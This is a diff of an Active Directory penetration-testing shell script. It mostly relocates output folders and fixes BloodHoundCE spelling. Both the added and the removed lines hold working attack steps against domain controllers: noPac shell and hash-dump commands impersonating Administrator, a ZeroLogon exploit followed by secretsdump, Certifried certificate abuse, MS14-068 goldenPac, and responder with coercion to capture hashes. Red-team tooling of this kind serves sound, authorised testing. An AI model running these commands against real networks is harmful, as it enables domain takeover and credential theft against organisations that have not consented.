@@ -416,7 +416,12 @@ prepare() {
         if [ -z "$domain" ]; then domain=$dc_domain; fi
     fi
 
-    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open)
+    mkdir -p "${output_dir}/Credentials"
+    mkdir -p "${output_dir}/DomainRecon/Servers"
+    mkdir -p "${output_dir}/DomainRecon/Users"
+    mkdir -p "${output_dir}/Scans"
+
+    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open -oG "${output_dir}/Scans/${dc_ip}"_mainports)
     if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
@@ -448,18 +453,6 @@ prepare() {
     target_dc=${dc_ip_list}
     target_sql=${sql_ip_list}
 
-    mkdir -p "${output_dir}/ADCS"
-    mkdir -p "${output_dir}/BruteForce"
-    mkdir -p "${output_dir}/Credentials"
-    mkdir -p "${output_dir}/CommandExec"
-    mkdir -p "${output_dir}/DomainRecon/Servers"
-    mkdir -p "${output_dir}/DomainRecon/Users"
-    mkdir -p "${output_dir}/Kerberos"
-    mkdir -p "${output_dir}/Modification"
-    mkdir -p "${output_dir}/Scans"
-    mkdir -p "${output_dir}/Shares"
-    mkdir -p "${output_dir}/Vulnerabilities"
-    mkdir -p "${output_dir}/Exploitation"
 
     if [ ! -f "${servers_ip_list}" ]; then /bin/touch "${servers_ip_list}"; fi
     if [ ! -f "${servers_hostname_list}" ]; then /bin/touch "${servers_hostname_list}"; fi
@@ -1006,23 +999,23 @@ bhd_enum_dconly() {
 
 bhdce_enum() {
     if [ ! -f "${bloodhoundce}" ]; then
-        echo -e "${RED}[-] Please verify the installation of BloodhoundCE${NC}"
+        echo -e "${RED}[-] Please verify the installation of BloodHoundCE${NC}"
     else
-        mkdir -p "${output_dir}/DomainRecon/BloodhoundCE"
-        echo -e "${BLUE}[*] BloodhoundCE Enumeration using all collection methods (Noisy!)${NC}"
-        if [ -n "$(find "${output_dir}/DomainRecon/BloodhoundCE/" -type f -name '*.json' -print -quit)" ]; then
+        mkdir -p "${output_dir}/DomainRecon/BloodHoundCE"
+        echo -e "${BLUE}[*] BloodHoundCE Enumeration using all collection methods (Noisy!)${NC}"
+        if [ -n "$(find "${output_dir}/DomainRecon/BloodHoundCE/" -type f -name '*.json' -print -quit)" ]; then
             echo -e "${YELLOW}[i] BloodHoundCE results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ]; then
-                echo -e "${PURPLE}[-] BloodhoundCE requires credentials${NC}"
+                echo -e "${PURPLE}[-] BloodHoundCE requires credentials${NC}"
             else
                 current_dir=$(pwd)
-                cd "${output_dir}/DomainRecon/BloodhoundCE" || exit
-                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodhoundCE/bloodhound_output_${dc_domain}.txt"
+                cd "${output_dir}/DomainRecon/BloodHoundCE" || exit
+                run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}" | tee "${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
-                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodhoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
-                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodhoundCE/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
+                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt"
+                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt"
+                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
                 parse_users
                 parse_servers
             fi
@@ -1033,7 +1026,7 @@ bhdce_enum() {
 
 bhdce_enum_dconly() {
     if [ ! -f "${bloodhoundce}" ]; then
-        echo -e "${RED}[-] Please verify the installation of BloodhoundCE${NC}"
+        echo -e "${RED}[-] Please verify the installation of BloodHoundCE${NC}"
     else
         mkdir -p "${output_dir}/DomainRecon/BloodHoundCE"
         echo -e "${BLUE}[*] BloodHoundCE Enumeration using DCOnly${NC}"
@@ -1710,7 +1703,7 @@ certipy_enum() {
             fi
         fi
     fi
-    adcs_vuln_parse | tee "${output_dir}/Exploitation/ADCS_exploitation_steps_${dc_domain}.txt"
+    adcs_vuln_parse | tee "${output_dir}/ADCS/ADCS_exploitation_steps_${dc_domain}.txt"
     echo -e ""
 }
 
@@ -1871,17 +1864,17 @@ certifried_check() {
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 if [ "${ldapbinding_bool}" == true ]; then ldapbinding_param="-ldap-channel-binding"; else ldapbinding_param=""; fi
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldapbinding_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" 2>&1 | tee "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"
-                if ! grep -q "Certificate object SID is" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"; then
-                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME " | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldapbinding_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" 2>&1 | tee "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt"
+                if ! grep -q "Certificate object SID is" "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/ADCS/certifried_check_${pki_server}_${dc_domain}.txt"; then
+                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME " | tee -a "${output_dir}/ADCS/Certifried_exploitation_steps_${dc_domain}.txt"
                 fi
             done
             cd "${current_dir}" || exit
@@ -2323,13 +2316,13 @@ nopac_check() {
     if [ "${kerb_bool}" == true ]; then
         echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
     else
-        run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
-        if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt"; then
-            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
-            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Exploitation/noPac_exploitation_steps_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${output_dir}/Kerberos/ne_nopac_output_${dc_domain}.txt" 2>&1
+        if grep -q "VULNERABLE" "${output_dir}/Kerberos/ne_nopac_output_${dc_domain}.txt"; then
+            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}# Get shell:${NC}" | tee -a "${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt"
+            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${output_dir}/Kerberos/noPac_exploitation_steps_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2343,11 +2336,11 @@ ms14-068_check() {
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
         else
-            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"
-            if grep -q "found vulnerable" "${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
-                echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
-                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/ms14-068_exploitation_steps_${dc_domain}.txt"
+            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Kerberos/ms14-068_output_${dc_domain}.txt"
+            if grep -q "found vulnerable" "${output_dir}/Kerberos/ms14-068_output_${dc_domain}.txt"; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt"
+                echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt"
+                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${output_dir}/Kerberos/ms14-068_exploitation_steps_${dc_domain}.txt"
             fi
         fi
     fi
@@ -2566,15 +2559,15 @@ zerologon_check() {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
     run_command "echo -n Y | ${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M zerologon --log ${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt" 2>&1
     if grep -q "VULNERABLE" "${output_dir}/Vulnerabilities/ne_zerologon_output_${dc_domain}.txt"; then
-        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
-        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${output_dir}/Exploitation/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}1. Exploit the vulnerability, set the NT hash to \\x00*8:${NC}" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}2. Obtain the Domain Admin's NT hash:${NC}" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py $dc_domain/$dc_NETBIOS\$@$dc_ip -no-pass -just-dc-user Administrator" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}3. Obtain the machine account hex encoded password:${NC}" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "secretsdump.py -hashes :<NTLMhash_Administrator> $dc_domain/Administrator@$dc_ip" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "${CYAN}4. Restore the machine account password:${NC}" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
+        echo -e "restorepassword.py -target-ip $dc_ip $dc_domain/$dc_NETBIOS@$dc_NETBIOS -hexpass <HexPass_$dc_NETBIOS>" | tee -a "${output_dir}/Vulnerabilities/zerologon_exploitation_steps_${dc_domain}.txt"
     fi
     echo -e ""
 }
@@ -2717,11 +2710,11 @@ coercer_check() {
         smb_scan
         run_command "${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt"
         if grep -q -r "SMB  Auth" "${output_dir}/Vulnerabilities/Coercer/"; then
-            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "sudo responder -I $attacker_interface" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip" | tee -a "${output_dir}/Exploitation/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "sudo responder -I $attacker_interface" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${CYAN}2. Coerce target server:${NC}" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
         fi
         echo -e ""
     fi
@@ -2785,7 +2778,7 @@ mssql_enum() {
             grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
         done
         if [ -f "${target_sql}" ]; then
-            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/DomainRecon/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -2802,7 +2795,7 @@ mssql_relay_check() {
         else
             echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/DomainRecon/mssql_relay_output_${dc_domain}.txt" 2>&1
+            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/MSSQL/mssql_relay_output_${dc_domain}.txt" 2>&1
         fi
     fi
     echo -e ""
@@ -2822,7 +2815,7 @@ mssqlclient_console() {
             read -rp ">> " mssqlclient_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening mssqlclient.py console on target: $mssqlclient_target ${NC}"
-        run_command "${impacket_mssqlclient} ${argument_imp}\\@${mssqlclient_target} -windows-auth" 2>&1 | tee -a "${output_dir}/DomainRecon/impacket_mssqlclient_output.txt"
+        run_command "${impacket_mssqlclient} ${argument_imp}\\@${mssqlclient_target} -windows-auth" 2>&1 | tee -a "${output_dir}/MSSQL/impacket_mssqlclient_output.txt"
     fi
     echo -e ""
 }
@@ -2834,6 +2827,8 @@ mssqlpwner_console() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] mssqlpwner requires credentials${NC}"
         else
+            current_dir=$(pwd)
+            cd "${output_dir}/MSSQL" || exit
             echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
             echo -e "${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}"
             read -rp ">> " mssqlpwner_target </dev/tty
@@ -2842,7 +2837,8 @@ mssqlpwner_console() {
                 read -rp ">> " mssqlpwner_target </dev/tty
             done
             echo -e "${BLUE}[*] Opening mssqlpwner console${NC}"
-            run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive" | tee -a "${output_dir}/DomainRecon/mssqlpwner_output_${dc_domain}.txt" 2>&1
+            run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive" | tee -a "${output_dir}/MSSQL/mssqlpwner_output_${dc_domain}.txt" 2>&1
+            cd "${current_dir}" || exit
         fi
     fi
     echo -e ""
@@ -3687,6 +3683,7 @@ evilwinrm_console() {
 }
 
 ad_enum() {
+    mkdir -p "${output_dir}/DomainRecon"
     if [ "${nullsess_bool}" == true ]; then
         ldapdomaindump_enum
         enum4linux_enum
@@ -3713,6 +3710,7 @@ ad_enum() {
 }
 
 adcs_enum() {
+    mkdir -p "${output_dir}/ADCS"
     if [ "${nullsess_bool}" == true ]; then
         ne_adcs_enum
     else
@@ -3724,6 +3722,7 @@ adcs_enum() {
 }
 
 bruteforce() {
+    mkdir -p "${output_dir}/BruteForce"
     if [ "${nullsess_bool}" == true ]; then
         ridbrute_attack
         kerbrute_enum
@@ -3736,6 +3735,7 @@ bruteforce() {
 }
 
 kerberos() {
+    mkdir -p "${output_dir}/Kerberos"
     if [ "${nullsess_bool}" == true ]; then
         asrep_attack
         kerberoast_attack
@@ -3753,6 +3753,7 @@ kerberos() {
 }
 
 scan_shares() {
+    mkdir -p "${output_dir}/Shares"
     smb_map
     ne_shares
     ne_spider
@@ -3760,6 +3761,7 @@ scan_shares() {
 }
 
 vuln_checks() {
+    mkdir -p "${output_dir}/Vulnerabilities"
     zerologon_check
     ms17-010_check
     spooler_check
@@ -3773,6 +3775,7 @@ vuln_checks() {
 }
 
 mssql_checks() {
+    mkdir -p "${output_dir}/MSSQL"
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${RED}MSSQL checks requires credentials.${NC}"
     else
@@ -3782,6 +3785,7 @@ mssql_checks() {
 }
 
 pwd_dump() {
+    mkdir -p "${output_dir}/Credentials"
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${RED}Password dump requires credentials.${NC}"
     else
@@ -3923,6 +3927,7 @@ get_domain_sid() {
 }
 
 ad_menu() {
+    mkdir -p "${output_dir}/DomainRecon"
     echo -e ""
     echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
     echo -e "--------------------------------------------------------"
@@ -4145,6 +4150,7 @@ ad_menu() {
 }
 
 adcs_menu() {
+    mkdir -p "${output_dir}/ADCS"
     echo -e ""
     echo -e "${CYAN}[ADCS menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------"
@@ -4229,6 +4235,7 @@ adcs_menu() {
 }
 
 bruteforce_menu() {
+    mkdir -p "${output_dir}/BruteForce"
     echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------------"
     if [ "${nullsess_bool}" == true ]; then
@@ -4318,6 +4325,7 @@ bruteforce_menu() {
 }
 
 kerberos_menu() {
+    mkdir -p "${output_dir}/Kerberos"
     echo -e ""
     echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------------------"
@@ -4782,6 +4790,7 @@ kerberos_menu() {
 }
 
 shares_menu() {
+    mkdir -p "${output_dir}/Shares"
     echo -e ""
     echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------------"
@@ -4864,6 +4873,7 @@ shares_menu() {
 }
 
 vulns_menu() {
+    mkdir -p "${output_dir}/Vulnerabilities"
     echo -e ""
     echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------"
@@ -4987,6 +4997,7 @@ vulns_menu() {
 }
 
 mssql_menu() {
+    mkdir -p "${output_dir}/MSSQL"
     echo -e ""
     echo -e "${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------------"
@@ -5047,6 +5058,7 @@ mssql_menu() {
 }
 
 pwd_menu() {
+    mkdir -p "${output_dir}/Credentials"
     echo -e ""
     echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
     echo -e "--------------------------------------------------------------"
@@ -5204,6 +5216,7 @@ pwd_menu() {
 }
 
 modif_menu() {
+    mkdir -p "${output_dir}/Modification"
     echo -e ""
     echo -e "${CYAN}[Modification menu]${NC} Please choose from the following options:"
     echo -e "-------------------------------------------------------------"
@@ -5316,6 +5329,7 @@ modif_menu() {
 }
 
 cmdexec_menu() {
+    mkdir -p "${output_dir}/CommandExec"
     echo -e ""
     echo -e "${CYAN}[Command Execution menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------------"
